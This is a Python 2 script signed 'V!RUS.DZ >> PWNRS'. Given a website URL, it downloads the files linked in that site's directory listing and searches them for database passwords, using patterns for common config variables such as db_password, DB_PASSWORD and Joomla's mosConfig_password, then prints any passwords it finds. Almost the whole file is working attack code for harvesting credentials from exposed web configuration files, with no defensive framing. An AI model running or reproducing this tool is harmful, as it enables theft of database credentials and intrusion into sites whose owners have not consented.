#!/usr/bin/env python

import sys
import os
os.system('color a') #green text
import re
import subprocess
import urllib
import glob
from platform import system


def banner():
  print '''
`7MMF'   `7MF'OO `7MM"""Mq.`7MMF'   `7MF'.M"""bgd    `7MM"""Yb.   MMM"""AMV
  `MA     ,V  88   MM   `MM. MM       M ,MI    "Y      MM    `Yb. M'   AMV 
   VM:   ,V   ||   MM   ,M9  MM       M `MMb.          MM     `Mb '   AMV  
    MM.  M'   ||   MMmmdM9   MM       M   `YMMNq.      MM      MM    AMV   
    `MM A'    `'   MM  YM.   MM       M .     `MM      MM     ,MP   AMV   ,
     :MM;     ,,   MM   `Mb. YM.     ,M Mb     dM ,,   MM    ,dP'  AMV   ,M
      VF      db .JMML. .JMM. `bmmmmd"' P"Ybmmd"  db .JMMmmmdP'   AMVmmmmMM
      
                          
  '''


if len(sys.argv) != 3:
  banner()
  print'''    
    Usage: %s [URL...] [directory...]
        
    Ex) %s http://www.test.com lnx1
  ''' % (sys.argv[0], sys.argv[0])
  sys.exit(1)


site = sys.argv[1]
fout = sys.argv[2]


try:
    req  = urllib.urlopen(site)
    read = req.read()
    if system() == 'Linux':
      f = open('/tmp/data.txt', 'w')
      f.write(read)
      f.close()
    if system() == 'Windows':
      f = open('data.txt', 'w')  
      f.write(read)
      f.close()


    i = 0
    if system() == 'Linux':
      banner()
      f = open('/tmp/data.txt', 'rU')
      for line in f:
        if line.startswith('<li><a') == True :
          m = re.search(r'(<a href=")(.+[^>])(">)', line)
          i += 1
          local_name = '%s/file%d.txt' % (fout, i)
          print 'Retrieving...\t\t', site + m.group(2)
          try:  urllib.urlretrieve(site + m.group(2), local_name)
          except IOError:
            print '\n[%s] doesn\'t exist, create it first' % fout
            sys.exit()
        if line.startswith('<img') == True:
          m1 = re.search(r'(<a href=")(.+[^>])(">)', line)
          i += 1
          local_name = '%s/file%d.txt' % (fout, i)
          print 'Retrieving...\t\t', site + m1.group(2)
          try:  urllib.urlretrieve(site + m1.group(2), local_name)
          except IOError:
            print '\n[%s] doesn\'t exist, create it first' % fout
            sys.exit()
        if line.startswith('<IMG') == True:
          m2 = re.search(r'(<A HREF=")(.+[^>])(">)', line)
          i += 1
          local_name = '%s/file%d.txt' % (fout, i)
          print 'Retrieving...\t\t', site + m2.group(2)
          try:  urllib.urlretrieve(site + m2.group(2), local_name)
          except IOError:
            print '\n[%s] doesn\'t exist, create it first' % fout
            sys.exit()
      f.close()
    if system() == 'Windows':
      banner()  
      f = open('data.txt', 'rU')
      for line in f:
        if line.startswith('<li><a') == True :
          m = re.search(r'(<a href=")(.+[^>])(">)', line)
          i += 1
          local_name = '%s/file%d.txt' % (fout, i)
          print 'Retrieving...\t\t', site + m.group(2)
          try:  urllib.urlretrieve(site + m.group(2), local_name)
          except IOError:
            print '\n[%s] doesn\'t exist, create it first' % fout
            sys.exit()
        if line.startswith('<img') == True:
          m1 = re.search(r'(<a href=")(.+[^>])(">)', line)
          i += 1
          local_name = '%s/file%d.txt' % (fout, i)
          print 'Retrieving...\t\t', site + m1.group(2)
          try:  urllib.urlretrieve(site + m1.group(2), local_name)
          except IOError:
            print '\n[%s] doesn\'t exist, create it first' % fout
            sys.exit()
        if line.startswith('<IMG') == True:
          m2 = re.search(r'(<A HREF=")(.+[^>])(">)', line)
          i += 1
          local_name = '%s/file%d.txt' % (fout, i)
          print 'Retrieving...\t\t', site + m2.group(2)
          try:  urllib.urlretrieve(site + m2.group(2), local_name)
          except IOError:
            print '\n[%s] doesn\'t exist, create it first' % fout
            sys.exit()
      f.close()
    if system() == 'Linux':
     cleanup = subprocess.Popen('rm -rf /tmp/data.txt > /dev/null', shell=True).wait()
    if system() == 'Windows':
      cleanup = subprocess.Popen('del C:\data.txt', shell=True).wait()
    print '\n', '-' * 100, '\n'
    if system() == 'Linux':
        for root, dirs, files in os.walk(fout):
          for fname in files:
            fullpath = os.path.join(root, fname)
            f = open(fullpath, 'r')
            for line in f:
              secr = re.search (r"(db_password'] = ')(.+[^>])(';)", line)
              if secr is not None: print (secr.group(2))  
              secr1 = re.search(r"(password = ')(.+[^>])(';)", line)
              if secr1 is not None:  print  (secr1.group(2))
              secr2 = re.search(r"(DB_PASSWORD')(...)(.+[^>])(')", line)
              if secr2 is not None: print (secr2.group(3))
              secr3 = re.search (r"(dbpass =..)(.+[^>])(.;)", line)
              if secr3 is not None: print (secr3.group(2))
              secr4 = re.search (r"(DBPASSWORD = ')(.+[^>])(.;)", line)
              if secr4 is not None: print (secr4.group(2))
              secr5 = re.search (r"(DBpass = ')(.+[^>])(';)", line)
              if secr5 is not None: print (secr5.group(2))
              secr6 = re.search (r"(dbpasswd = ')(.+[^>])(';)", line)
              if secr6 is not None: print (secr6.group(2))
              secr7 = re.search (r"(mosConfig_password = ')(.+[^>])(';)", line)
              if secr7 is not None: print (secr7.group(2))
            f.close()
    if system() == 'Windows':
        for infile in glob.glob( os.path.join(fout, '*.txt') ):
            f = open(infile, 'r')
            for line in f:
              secr = re.search (r"(db_password'] = ')(.+[^>])(';)", line)
              if secr is not None: print (secr.group(2))  
              secr1 = re.search(r"(password = ')(.+[^>])(';)", line)
              if secr1 is not None:  print  (secr1.group(2))
              secr2 = re.search(r"(DB_PASSWORD')(...)(.+[^>])(')", line)
              if secr2 is not None: print (secr2.group(3))
              secr3 = re.search (r"(dbpass =..)(.+[^>])(.;)", line)
              if secr3 is not None: print (secr3.group(2))
              secr4 = re.search (r"(DBPASSWORD = ')(.+[^>])(.;)", line)
              if secr4 is not None: print (secr4.group(2))
              secr5 = re.search (r"(DBpass = ')(.+[^>])(';)", line)
              if secr5 is not None: print (secr5.group(2))
              secr6 = re.search (r"(dbpasswd = ')(.+[^>])(';)", line)
              if secr6 is not None: print (secr6.group(2))
              secr7 = re.search (r"(mosConfig_password = ')(.+[^>])(';)", line)
              if secr7 is not None: print (secr7.group(2))
            f.close()
            
    print '\nCreated by: V!RUS.DZ \n >> PWNRS'
except (KeyboardInterrupt):
    print '\nThanks for using it ._^'
    